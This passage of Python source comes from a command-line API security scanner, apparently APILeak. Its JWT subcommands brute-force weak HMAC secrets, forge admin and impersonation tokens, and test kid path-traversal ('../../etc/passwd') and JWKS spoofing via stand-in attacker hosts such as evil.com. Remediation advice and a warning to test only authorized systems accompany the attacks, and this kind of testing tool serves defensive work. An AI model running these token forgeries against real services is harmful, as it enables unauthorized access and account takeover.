        # 2️⃣ & 3️⃣ Recover the secret by SIGNATURE VERIFICATION (Req 16.1-16.3).
        # A candidate is recovered if and only if verify_hmac_secret is True:
        # the HMAC over the ORIGINAL raw header.payload segments equals the
        # original signature. We never re-encode the full token and string-
        # compare it to the original (Req 16.2), which previously missed valid
        # secrets due to re-serialization differences. ``None`` sentinel is used
        # so a legitimately recovered empty-string secret is not treated as
        # "not found".
        found_secret = None
        candidates = secrets[:max_attempts]
        for i, secret in enumerate(candidates):
            if i % 50 == 0 and i > 0:
                click.echo(f"🔄 Progress: {i}/{len(candidates)} ({(i/len(candidates)*100):.1f}%)")
            try:
                if verify_hmac_secret(token, secret):
                    found_secret = secret
                    break
            except Exception:
                continue

        if found_secret is None:
            click.echo(f"\n❌ Secret not found in wordlist")
            click.echo(f"💡 Try a larger wordlist or the secret may be strong")
            return

        # 🎉 SECRET RECOVERED! Report the recovered secret AND the matching
        # algorithm (Req 16.4). The matching algorithm is the header ``alg`` that
        # verify_hmac_secret validated the signature against.
        click.echo(f"\n" + "="*60)
        click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
        click.echo("="*60)
        click.echo(f"🔑 Recovered Secret: '{found_secret}'")
        click.echo(f"🧮 Matching Algorithm: {algorithm}")
        click.echo(f"⚠️  This JWT uses a weak secret that can be brute-forced!")
        click.echo("")

        # 4️⃣ & 5️⃣ Forge and exploit through the single-source-of-truth engine.
        # Using the recovered secret as the signing key, the engine forges the
        # privilege-escalation / impersonation / expiration-bypass tokens and,
        # when a URL is supplied, issues them through the shared HTTPRequestEngine
        # (Req 17.1). Success is decided by the engine's response analyzer, never
        # by admin/dashboard keyword presence (Req 19.2).
        forge_vectors = (
            AttackType.WEAK_SECRET,
            AttackType.PRIVILEGE_ESCALATION,
            AttackType.USER_IMPERSONATION,
            AttackType.EXPIRATION_BYPASS,
        )

        if url:
            click.echo("4️⃣ Forging and testing exploitation tokens via JWTAttackEngine...")
            click.echo(f"🎯 Target: {url}")

            async def _run():
                http_engine = _build_jwt_http_engine(timeout)
                try:
                    engine = _make_jwt_engine(
                        token, url, custom_headers, data,
                        http_engine=http_engine, signing_secret=found_secret)
                    for attack_type in forge_vectors:
                        result = await engine.execute_attack(attack_type)
                        _report_attack_result(result)
                finally:
                    await http_engine.close()

            asyncio.run(_run())
        else:
            click.echo("4️⃣ Forging exploitation tokens via JWTAttackEngine...")
            engine = _make_jwt_engine(
                token, url, custom_headers, data, signing_secret=found_secret)
            for attack_type in forge_vectors:
                _display_generated_tokens(engine, attack_type)
            click.echo("\n⚠️  Provide --url to test the forged tokens against an endpoint")

        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Secret recovered: '{found_secret}' (alg: {algorithm})")
        if url:
            click.echo(f"✅ Endpoint testing completed")

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
        click.echo("• Consider switching to RS256 (asymmetric) algorithm")
        click.echo("• Implement proper secret rotation policies")
        click.echo("• Never use default or common secrets")

        if found_secret in ["secret", "password", "123456", ""]:
            click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-kid-injection')
@click.argument('token')
@click.option('--kid-payload', default='../../etc/passwd', help='Kid injection payload')
@click.option('--payload', help='Custom JWT payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test kid injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, timeout):
    """Test Key ID (kid) injection vulnerability
    
    \b
    🗝️ HIGH → CRITICAL SEVERITY ATTACK
    Key ID (kid) injection - depends on backend implementation:
    
    1️⃣ Injecting malicious kid parameter
    2️⃣ Testing local file paths: "kid": "../../etc/passwd"
    3️⃣ Testing remote URLs: "kid": "http://attacker/key.pem"
    4️⃣ Signing token with controlled key
    5️⃣ Testing real API access
    
    \b
    🧪 Expected Exploitation:
    • File disclosure (path traversal)
    • Validation with arbitrary keys
    • Remote key fetching from attacker server
    • Potential RCE in vulnerable parsers
    
    \b
    Examples:
      # Basic kid injection test
      python apileaks.py jwt test-kid-injection TOKEN
      
      # Test with custom kid payload
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"
      
      # Test with custom JWT payload
      python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'
      
      # Test against real endpoint with both custom payloads
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "../../etc/passwd" --payload '{"admin":true}' --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Key ID (kid) Injection Attack")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: HIGH → CRITICAL (depends on backend)")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated kid
        # injection payload set; a custom --payload is merged onto the base token.
        base_token = token
        if payload:
            try:
                custom_payload = json.loads(payload)
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
            merged = copy.deepcopy(decoded['payload'])
            merged.update(custom_payload)
            base_token = encode_jwt(decoded['header'], merged, 'secret')

        _run_jwt_vector(base_token, AttackType.KID_INJECTION, url, custom_headers,
                        data, timeout)

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Validate and sanitize kid parameter before use")
        click.echo("• Use allowlist of permitted key identifiers")
        click.echo("• Never use kid parameter directly in file paths or URLs")
        click.echo("• Implement proper input validation and path traversal protection")
        click.echo("• Avoid dynamic key loading based on user input")
        click.echo("• Use static key stores with predefined key identifiers")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-jwks-spoof')
@click.argument('token')
@click.option('--jwks-url', default='http://attacker.com/jwks.json', help='Malicious JWKS URL')
@click.option('--url', '-u', help='Target URL to test JWKS spoofing against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
    """Test JWKS spoofing vulnerability
    
    \b
    JWKS spoofing - breaks trust boundary by:
    
    1️⃣ Detecting JWKS endpoint usage\b
    2️⃣ Spoofing remote JWKS URL\b
    3️⃣ Publishing attacker-controlled keys\b
    4️⃣ Signing token with attacker key\b
    5️⃣ Testing real API access\b

    
    \b
    Examples:
      # Basic JWKS spoofing test
      python apileaks.py jwt test-jwks-spoof TOKEN
      
      # Test with custom malicious JWKS URL
      python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json
      
      # Test against real endpoint
      python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 JWKS Spoofing Attack")
        click.echo("="*30)
        click.echo("🔥 SEVERITY: CRITICAL - Trust Boundary Broken")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # jku/x5u spoofing URL set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.JWKS_SPOOF, url, custom_headers,
                        data, timeout)

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
        click.echo("• Validate JWKS URLs against strict patterns")
        click.echo("• Use certificate pinning for JWKS endpoints")
        click.echo("• Implement network-level restrictions for JWKS fetching")
        click.echo("• Never trust user-controlled jku or x5u parameters")
        click.echo("• Consider using static key stores instead of dynamic JWKS")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-inline-jwks')
@click.argument('token')
@click.option('--url', '-u', help='Target URL to test inline JWKS injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
    """Test inline JWKS injection vulnerability
    
    \b
    Inline JWKS injection - total cryptographic validation control by:
    
    1️⃣ Generating attacker's own key pair\n
    2️⃣ Injecting JWKS inline in header\b
    3️⃣ Signing JWT with attacker's private key\b
    4️⃣ Sending token with embedded public key\b
    5️⃣ Testing admin access\b
    
    
    \b
    Examples:
      # Basic inline JWKS test
      python apileaks.py jwt test-inline-jwks TOKEN
      
      # Test against real endpoint
      python apileaks.py jwt test-inline-jwks TOKEN --url https://api.example.com/admin
      
      # Test with custom headers
      python apileaks.py jwt test-inline-jwks TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 Inline JWKS Injection Attack")
        click.echo("="*35)
        click.echo("🔥 SEVERITY: CRITICAL - Total Cryptographic Control")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # Route generation + execution through the single-source-of-truth engine
        # (Requirements 14.2, 14.3, 17.1, 19.2). The engine owns the curated
        # inline-JWK set and signs with the resolved key.
        _run_jwt_vector(token, AttackType.INLINE_JWKS, url, custom_headers,
                        data, timeout)

        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• NEVER trust inline JWK parameters in JWT headers")
        click.echo("• Implement strict JWK source validation")
        click.echo("• Use static key stores with predefined keys only")
        click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
        click.echo("• Implement proper key management with trusted sources")
        click.echo("• Use certificate pinning for key validation")

    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('attack-test')
@click.argument('token')
@click.option('--url', '-u', required=True, help='Target URL to test JWT attacks against')
@click.option('--header', '-H', multiple=True, help='Custom headers (format: "Name: Value"). Can be used multiple times.')
@click.option('--data', '-d', help='POST data for request body (JSON format recommended)')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.option('--no-ssl-verify', is_flag=True, help='Disable SSL certificate verification for testing')
@click.option('--max-retries', default=3, help='Maximum retry attempts for failed requests (default: 3)')
@click.pass_context
def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_retries):
    """Comprehensive JWT attack testing against live endpoints
    
    Performs automated security testing of JWT tokens against live API endpoints
    to identify common JWT vulnerabilities. This command executes multiple attack
    vectors and provides detailed vulnerability assessment with evidence.
    
    \b
    Attack Vectors Tested:
    • Algorithm Confusion Attacks
      - alg:none bypass (removes signature requirement)
      - Null signature attacks (various bypass techniques)
      - Algorithm downgrade (RS256 to HS256 confusion)
    
    • Secret-Based Attacks  
      - Weak HMAC secret brute-force using common wordlists
      - Empty secret testing
      - Predictable secret patterns
    
    • Injection Attacks
      - Key ID (kid) injection (path traversal, command injection)
      - JWKS URL spoofing (jku parameter manipulation)
      - Inline JWKS injection (embed malicious public keys)
    
    • Payload Manipulation
      - Privilege escalation (modify role/admin claims)
      - User impersonation (change user identifier claims)
      - Expiration bypass (remove or extend exp claims)
    
    \b
    Response Analysis:
    • Compares attack responses against baseline (original token)
    • Detects authentication bypass indicators
    • Identifies privilege escalation attempts
    • Analyzes response timing for blind vulnerabilities
    • Provides confidence scoring for findings
    
    \b
    Required Arguments:
      TOKEN                 JWT token to use as base for attack generation
    
    \b
    Required Options:
      -u, --url URL         Target endpoint URL to test attacks against
                           Must be a complete URL (e.g., https://api.example.com/protected)
    
    \b
    Optional Parameters:
      -H, --header TEXT     Custom HTTP headers to include in all requests
                           Format: "Header-Name: Header-Value"
                           Can be specified multiple times for different headers
                           Example: -H "Authorization: Bearer token" -H "X-API-Key: key123"
    
      -d, --data TEXT       POST data to include in request body
                           Recommended format: JSON string
                           Example: -d '{"userId": 123, "action": "read"}'
    
      --timeout INTEGER     HTTP request timeout in seconds (default: 30)
                           Increase for slow endpoints or networks
    
      --no-ssl-verify       Disable SSL certificate verification
                           Use for testing against self-signed certificates
                           WARNING: Only use in testing environments
    
      --max-retries INTEGER Maximum retry attempts for failed requests (default: 3)
                           Helps handle temporary network issues
    
    \b
    Basic Usage Examples:
      # Test JWT against a protected endpoint
      python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... --url https://api.example.com/user/profile
    
      # Test with custom authentication header
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/admin -H "X-API-Key: secret123"
    
      # Test POST endpoint with request body
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/update -d '{"name": "test"}'
    
    \b
    Advanced Usage Examples:
      # Multiple custom headers with extended timeout
      python apileaks.py jwt attack-test TOKEN -u URL \\
        -H "Authorization: Bearer backup-token" \\
        -H "X-Forwarded-For: 127.0.0.1" \\
        -H "User-Agent: Mobile-App/1.0" \\
        --timeout 60
    
      # Testing against development server with self-signed certificate
      python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected \\
        --no-ssl-verify --max-retries 5
    
      # Complex POST request with JSON payload
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/transactions \\
        -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \\
        -H "Content-Type: application/json"
    
    \b
    Output and Results:
    • Real-time progress display with attack status
    • Detailed vulnerability findings with severity levels
    • Evidence and exploitation steps for successful attacks
    • Files saved to 'jwtattack/[session-id]/' directory:
      - tokens/: Generated attack tokens (*.jwt files)
      - responses/: HTTP response details (*.json files)  
      - reports/: Human-readable and machine-parseable reports
      - baseline_response.json: Original token response for comparison
    
    \b
    Exit Codes:
      0    No vulnerabilities found or low/medium severity only
      1    High severity vulnerabilities detected
      2    Critical vulnerabilities detected
      130  Interrupted by user (Ctrl+C)
    
    \b
    Security Notes:
    • Only test against systems you own or have explicit permission to test
    • This tool generates multiple HTTP requests - be mindful of rate limits
    • Some attacks may trigger security monitoring - ensure proper authorization
    • Results should be verified manually before reporting as vulnerabilities
    
    \b
    Integration with Existing JWT Commands:
    • Uses same JWT utilities as other jwt subcommands for consistency
    • Leverages existing attack logic from test-alg-none, brute-secret, etc.
    • Compatible with tokens generated by 'jwt encode' command
    • Output format consistent with other APILeak reporting
    """
    try:
        # Validate JWT token first
        try:
            decoded_token = decode_jwt(token)
            click.echo("🔍 JWT Token Analysis")
            click.echo("="*50)
            click.echo(f"Algorithm: {decoded_token['header'].get('alg', 'Unknown')}")
            click.echo(f"Token Type: {decoded_token['header'].get('typ', 'Unknown')}")
            if 'sub' in decoded_token['payload']:
                click.echo(f"Subject: {decoded_token['payload']['sub']}")
            if 'exp' in decoded_token['payload']:
                import datetime
                exp_time = datetime.datetime.fromtimestamp(decoded_token['payload']['exp'])
                click.echo(f"Expires: {exp_time.strftime('%Y-%m-%d %H:%M:%S UTC')}")
            click.echo("")
        except Exception as e:
            click.echo(f"❌ Invalid JWT token: {e}", err=True)
            sys.exit(1)
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Display attack configuration
        click.echo("🎯 Attack Configuration")
        click.echo("="*50)
        click.echo(f"Target URL: {url}")
        if custom_headers:
            click.echo("Custom Headers:")
            for name, value in custom_headers.items():
                # Mask sensitive headers for display
                if name.lower() in ['authorization', 'cookie', 'x-api-key']:
                    masked_value = value[:10] + "..." if len(value) > 10 else "***"
                    click.echo(f"  {name}: {masked_value}")
                else:
                    click.echo(f"  {name}: {value}")
        if data:
            click.echo(f"POST Data: {data[:100]}{'...' if len(data) > 100 else ''}")
        click.echo(f"Timeout: {timeout}s")
        click.echo(f"SSL Verification: {'Disabled' if no_ssl_verify else 'Enabled'}")
        click.echo(f"Max Retries: {max_retries}")
        click.echo("")
        
        # Route all attack-token generation and execution through the single-
        # source-of-truth JWTAttackEngine (Requirements 14.2, 14.3), issuing HTTP
        # through the shared HTTPRequestEngine (Requirement 17.1). Success is
        # decided by the engine's response analyzer, not keyword presence
        # (Requirements 19.1, 19.2).
        from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
        from core.config import RateLimitConfig

        async def run_attack_test():
            rate_limiter = RateLimiter(RateLimitConfig())
            retry_config = RetryConfig(max_attempts=max_retries)
            http_engine = HTTPRequestEngine(
                rate_limiter, retry_config, timeout=timeout,
                verify_ssl=not no_ssl_verify)
            try:
                engine = _make_jwt_engine(
                    token, url, custom_headers, data, http_engine=http_engine)

                click.echo("🚀 Starting JWT Attack Testing...")
                click.echo("="*50)

                attack_summary = await engine.execute_all()
            finally:
                await http_engine.close()

            # Display results summary
            click.echo("\n" + "="*60)
            click.echo("JWT Attack Testing Results")
            click.echo("="*60)

            session = attack_summary.session
            click.echo(f"Session ID: {session.session_id}")
            click.echo(f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A")
            click.echo(f"Total Attacks: {session.total_attacks}")
            click.echo(f"Successful Attacks: {session.successful_attacks}")
            click.echo(f"Success Rate: {session.success_rate:.1f}%")

            # Show vulnerability summary (analyzer-based, Req 19.1/19.3)
            if attack_summary.vulnerabilities_found:
                click.echo(f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}")
                for vuln in attack_summary.vulnerabilities_found:
                    severity_icon = "🔴" if vuln.vulnerability_assessment.severity.value == "Critical" else "🟠" if vuln.vulnerability_assessment.severity.value == "High" else "🟡"
                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value}, confidence {vuln.vulnerability_assessment.confidence_score:.2f})")

            if attack_summary.potential_vulnerabilities:
                click.echo(f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}")
                for vuln in attack_summary.potential_vulnerabilities:
                    click.echo(f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})")

            if not attack_summary.vulnerabilities_found and not attack_summary.potential_vulnerabilities:
                click.echo("\n✅ No vulnerabilities detected")

            # Exit with appropriate code based on findings
            if attack_summary.has_critical_findings:
                click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
                sys.exit(2)
            elif attack_summary.has_high_findings:
                click.echo("\n🟠 Exiting with code 1 due to high severity vulnerabilities")
                sys.exit(1)
            else:
                click.echo("\n✅ Attack testing completed successfully")
                sys.exit(0)

        # Run the async attack test
        asyncio.run(run_attack_test())
        
    except KeyboardInterrupt:
        click.echo("\n❌ Attack testing interrupted by user")
        sys.exit(130)
    except Exception as e:
        click.echo(f"\n❌ Attack testing failed: {e}", err=True)
        sys.exit(1)


# Legacy main command for backward compatibility
@cli.command(hidden=True)
@click.option('--config', '-c', type=click.Path(exists=True), 
              help='Configuration file path (YAML or JSON) - optional')
@click.option('--target', '-t', help='Target URL to scan (overrides config)')
@click.option('--output', '-o', default='reports', help='Output directory for reports')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.pass_context
def main(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit):
    """Legacy main command - redirects to full scan"""
    ctx.invoke(full, config=config, target=target, output=output, log_level=log_level,
               log_file=log_file, json_logs=json_logs, modules=modules, rate_limit=rate_limit)


# Severity ladder for CI/CD gate evaluation, ordered from highest to lowest.
SEVERITY_LADDER = ["critical", "high", "medium", "low"]


def _count_by_severity(findings):
    """Count findings by severity name for the CI severity gate.

    Args:
        findings: Iterable of Finding objects.

    Returns:
        A mapping of ``{"critical": int, "high": int, "medium": int, "low": int}``.
    """
    counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for finding in findings:
        severity = getattr(finding, 'severity', None)
        name = getattr(severity, 'value', severity)
        if isinstance(name, str):
            name = name.lower()
        if name in counts:
            counts[name] += 1
    return counts


def evaluate_severity_gate(counts, fail_on):
    """
    Deterministically map finding counts and a fail-on threshold to a CI exit code.

    This is a pure function (no I/O, no side effects) so the CI severity-gate
    behavior is deterministic and independently testable.

    Args:
        counts: Mapping of severity name -> count, e.g.
                ``{"critical": 1, "high": 0, "medium": 2, "low": 0}``.
                Missing keys are treated as zero.
        fail_on: Severity threshold, one of "critical", "high", "medium", "low".
                 Unknown/empty values fall back to the strictest threshold
                 ("critical").

    Returns:
        2 if at least one critical finding is present and the highest finding
          present meets or exceeds the threshold (Requirement 9.2),
        1 if the highest finding present meets or exceeds the threshold but no
          critical finding is present,
        0 if the highest finding present is below the threshold, or there are
          no findings at all (Requirement 9.3).
    """
    fail_on = (fail_on or "critical").lower()
    if fail_on not in SEVERITY_LADDER:
        fail_on = "critical"

    threshold_rank = SEVERITY_LADDER.index(fail_on)  # 0 = critical (strictest)

    # Highest severity actually present is the lowest index in the ladder.
    highest_present_rank = None
    for rank, severity in enumerate(SEVERITY_LADDER):
        if counts.get(severity, 0) > 0:
            highest_present_rank = rank
            break

    # No findings present -> pass.
    if highest_present_rank is None:
        return 0

    # Highest present severity is below the threshold -> pass (Requirement 9.3).
    if highest_present_rank > threshold_rank:
        return 0

    # Threshold met or exceeded: critical present -> 2 (Requirement 9.2), else 1.
    if counts.get("critical", 0) > 0:
        return 2
    return 1


async def run_enhanced_apileak(config, ci_mode=False, fail_on="critical", baseline=None, discovery_progress=None, scope_endpoints=None, checkpoint_path=None, resume_checkpoint=None):
    """
    Run enhanced APILeak scan with full integration of all components
    
    Args:
        config: APILeak configuration
        ci_mode: Whether running in CI/CD mode
        fail_on: Severity level to fail on in CI mode
        baseline: Optional path to a baseline JSON report. When provided,
                  findings are classified into new vs known and the CI severity
                  gate evaluates only the New_Finding set (Requirements 11.1-11.5).
        discovery_progress: Optional live Progress_Display (Requirement 32). When
                  provided it is attached to the core so the endpoint fuzzer
                  renders live discovery progress; otherwise discovery runs
                  without a display.
        scope_endpoints: Optional pre-selected discovered records
                  (``DiscoveryResult`` objects) defining a Batch_Scan_Scope.
                  When non-empty, the set is threaded into
                  ``APILeakCore.run_scan(scope_endpoints=...)`` which seeds the
                  discovery phase directly so the OWASP modules consume exactly
                  the seeded endpoints, skipping wordlist discovery
                  (Requirements 36.3, 36.8).
    """
    logger = get_logger("run_enhanced_apileak")
    
    # Initialize APILeak Core with enhanced orchestration
    core = APILeakCore(config)
    
    # Attach the live Progress_Display (if any) before discovery runs so the
    # endpoint fuzzer can render it (Requirement 32). No-op/disabled instances
    # are harmless.
    if discovery_progress is not None:
        core.discovery_progress = discovery_progress

    # Attach the resume/checkpoint state (Requirement 37) before discovery runs.
    # ``checkpoint_path`` enables periodic checkpoint writes; ``resume_checkpoint``
    # is a pre-loaded DiscoveryCheckpoint used to seed the fuzzer before discovery
    # so already-tested candidates are skipped and results merge. Both are None by
    # default, leaving discovery unchanged.
    if checkpoint_path is not None:
        core.discovery_checkpoint_path = checkpoint_path
    if resume_checkpoint is not None:
        core.discovery_resume_checkpoint = resume_checkpoint
    
    # Perform health check
    health_status = await core.health_check()
    if health_status["status"] != "healthy":
        logger.warning("Health check indicates issues", status=health_status)
    
    # Run the enhanced scan with intelligent orchestration
    target_url = config.target.base_url
    logger.info("Starting enhanced APILeak scan", target=target_url, ci_mode=ci_mode)
    
    # Show enhanced scan configuration
    click.echo(f"\n🎯 Target: {target_url}")
    
    # Display enabled advanced features
    advanced_features = []
    if hasattr(config.advanced_discovery, 'framework_detection') and config.advanced_discovery.framework_detection.get('enabled'):
        advanced_features.append("Framework Detection")
    if hasattr(config.advanced_discovery, 'version_fuzzing') and config.advanced_discovery.version_fuzzing.get('enabled'):
        advanced_features.append("Version Fuzzing")
    if hasattr(config.advanced_discovery, 'payload_encoding') and config.advanced_discovery.payload_encoding.get('enabled'):
        advanced_features.append("Payload Encoding")
    if hasattr(config.advanced_discovery, 'waf_detection') and config.advanced_discovery.waf_detection.get('enabled'):
        advanced_features.append("WAF Evasion")
    if config.advanced_discovery.subdomain_discovery:
        advanced_features.append("Subdomain Discovery")
    if config.advanced_discovery.cors_analysis:
        advanced_features.append("CORS Analysis")
    
    if advanced_features:
        click.echo(f"🚀 Advanced Features: {', '.join(advanced_features)}")
    
    # Display OWASP modules
    if config.owasp_testing.enabled_modules:
        click.echo(f"🛡️  OWASP Modules: {', '.join(config.owasp_testing.enabled_modules)}")
    
    if hasattr(config.fuzzing, 'response_filter') and config.fuzzing.response_filter:
        click.echo(f"📊 Response Filter: {config.fuzzing.response_filter}")
    if hasattr(config, 'http_output') and config.http_output.status_code_filter:
        click.echo(f"🎨 Status Code Filter: {config.http_output.status_code_filter}")
    if config.authentication.contexts[0].token:
        click.echo("🔐 Authentication: JWT Token provided")
    if hasattr(config.fuzzing.headers, 'random_user_agent') and config.fuzzing.headers.random_user_agent:
        click.echo("🎭 WAF Evasion: Random User-Agent enabled")
    
    click.echo(f"⚡ Rate Limit: {config.rate_limiting.requests_per_second} req/sec")
    
    if getattr(config, 'safe_mode', False):
        click.echo("🛟 Safe Mode: Enabled (state-changing probes skipped, safe methods only)")
    
    if ci_mode:
        click.echo(f"🔄 CI/CD Mode: Enabled (fail on {fail_on}+ severity)")
    
    click.echo("")
    
    try:
        # Execute the enhanced scan with intelligent orchestration
        results = await core.run_scan(target_url, scope_endpoints=scope_endpoints)
        
        # Generate enhanced reports with all findings
        from utils.report_generator import ReportGenerator
        
        report_generator = ReportGenerator()
        
        # Determine scan type for report naming
        scan_type = "full"
        if config.fuzzing.endpoints.enabled and not config.fuzzing.parameters.enabled:
            scan_type = "dir"
        elif config.fuzzing.parameters.enabled and not config.fuzzing.endpoints.enabled:
            scan_type = "param"
        
        # Generate reports with custom names
        output_filename = getattr(config.reporting, 'output_filename', None)
        report_files = report_generator.save_reports(results, config.reporting.output_dir, scan_type, output_filename, formats=getattr(config.reporting, 'formats', None))
        
        # Display enhanced summary with advanced features results
        click.echo("\n" + "="*60)
        click.echo("APILeak Enhanced Scan Completed Successfully")
        click.echo("="*60)
        click.echo(f"Target: {target_url}")
        click.echo(f"Scan ID: {results.scan_id}")
        click.echo(f"Duration: {results.performance_metrics.duration}")
        
        # Surface discovery recursion-control status (budget reached / catch-all
        # detected) so the operator sees when discovery was truncated or wildcard
        # responses were excluded (Requirements 18.5, 19.5).
        _echo_discovery_control_status(core)
        
        # Get enhanced statistics from findings collector
        if hasattr(results, 'findings_collector') and results.findings_collector:
            stats = results.findings_collector.get_statistics()
            owasp_coverage = results.findings_collector.get_owasp_coverage()
            
            # Show advanced discovery results if available
            if hasattr(results, 'advanced_results'):
                advanced_results = results.advanced_results
                if hasattr(advanced_results, 'framework_detected') and advanced_results.framework_detected:
                    click.echo(f"🔍 Framework Detected: {advanced_results.framework_detected.name} (confidence: {advanced_results.framework_detected.confidence:.2f})")
                if hasattr(advanced_results, 'api_versions_found') and advanced_results.api_versions_found:
                    click.echo(f"📋 API Versions Found: {len(advanced_results.api_versions_found)}")
                if hasattr(advanced_results, 'subdomains_discovered') and advanced_results.subdomains_discovered:
                    click.echo(f"🌐 Subdomains Discovered: {len(advanced_results.subdomains_discovered)}")
                if hasattr(advanced_results, 'waf_detected') and advanced_results.waf_detected:
                    click.echo(f"🛡️  WAF Detected: {advanced_results.waf_detected.name} (confidence: {advanced_results.waf_detected.confidence:.2f})")
            
            # Show scan-specific metrics
            if scan_type == "dir":
                endpoints_tested = getattr(results.statistics, 'endpoints_tested', 0)
                click.echo(f"Total Endpoints Tested: {endpoints_tested}")
                if hasattr(results, 'discovered_endpoints'):
                    valid_endpoints = [e for e in core.get_discovered_endpoints() if hasattr(e, 'status_code') and e.status_code in [200, 201, 202, 204]]
                    if valid_endpoints:
                        click.echo("📍 Endpoints Found:")
                        for endpoint in valid_endpoints[:10]:  # Show first 10
                            click.echo(f"  - {endpoint.method} {endpoint.url} ({endpoint.status_code})")
                        if len(valid_endpoints) > 10:
                            click.echo(f"  ... and {len(valid_endpoints) - 10} more")
